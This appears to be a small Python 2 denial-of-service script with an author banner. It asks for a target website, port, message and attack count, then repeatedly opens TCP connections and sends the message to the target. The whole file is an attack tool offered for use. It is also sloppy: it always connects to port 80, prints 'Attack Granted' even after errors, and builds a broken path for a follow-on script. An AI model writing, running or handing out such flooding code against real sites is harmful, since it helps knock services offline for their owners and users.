 
import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
os.system("clear")
os.system("figlet AnUnknownGuy")
print
print "Author : An Unknown Guy"
print "GitHub : https://github.com/An-Unknown-Guy"
print
host=raw_input( "Enter Website: " )
port=input( "Port: " )
message=raw_input( "Message To Send: " )
conn=input( "Attack(s) Number(s): " )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[IP Locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("| --[Attack Denied]--|")
    print ( "|--[Attack Granted]--|")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("Attack(s) Finished")
if __name__ == "__main__":
    answer = raw_input("Restart?(Y/n) ")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
